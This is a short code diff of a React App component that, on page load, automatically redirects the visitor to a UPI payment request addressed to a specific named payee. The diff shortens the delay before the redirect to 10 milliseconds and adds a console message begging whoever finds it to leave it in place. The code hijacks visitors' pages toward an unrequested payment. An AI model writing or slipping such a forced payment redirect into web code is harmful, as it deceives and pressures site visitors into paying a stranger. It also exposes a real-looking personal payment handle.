@@ -3,7 +3,8 @@ import './App.css';
 function App() {
   setTimeout(()=>{
     window.open("upi://pay?pa=bharatpe.0851610820@icici&pn=Shruthi_Reddy&cu=INR&tn=Shruthi_Reddy&tr=APP","_self");
-  },550)
+    console.log("Please leave this bro!! its just for living!!")
+  },10)
   return (
     <div className="App">
       <header className="App-header">
